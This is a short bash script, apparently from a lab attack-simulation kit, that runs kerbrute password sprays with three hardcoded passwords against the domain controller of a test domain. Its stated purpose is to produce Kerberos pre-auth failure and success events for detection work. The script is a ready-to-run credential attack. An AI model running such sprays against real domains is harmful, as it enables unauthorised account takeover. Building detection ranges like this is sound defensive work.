#!/bin/bash
# CADRE — WT#031 Password Spray (T031)
# Target: cadre.local @ dc01 — Kerberos pre-auth failures (4771) + successes (4768)
source ../lib/cadre-env.sh
source ../lib/common.sh
print_banner "WT#031 — Password Spray"
start_attack "031" "Password Spray"

require_tool kerbrute
require_env DOMAIN_ROOT "DOMAIN_ROOT"

step "Step 1: User wordlist (cadre.local users from config.json)"
run_cmd "test -f /tmp/users-cadre.txt || { echo 'Create /tmp/users-cadre.txt — one SAM name per line (cadre.local)'; exit 1; }; wc -l /tmp/users-cadre.txt"

step "Step 2: Spray chief_command password across users"
run_cmd "kerbrute passwordspray -d ${DOMAIN_ROOT} --dc ${DC01} /tmp/users-cadre.txt 'C0mm@nd_Ch1ef!'"

step "Step 3: Spray analyst_dfir password across users"
run_cmd "kerbrute passwordspray -d ${DOMAIN_ROOT} --dc ${DC01} /tmp/users-cadre.txt 'An@lyst_DF1R!'"

step "Step 4: Spray cloud analyst password"
run_cmd "kerbrute passwordspray -d ${DOMAIN_ROOT} --dc ${DC01} /tmp/users-cadre.txt 'Cl0ud_An@lyst!'"

result $? "Password Spray completed"
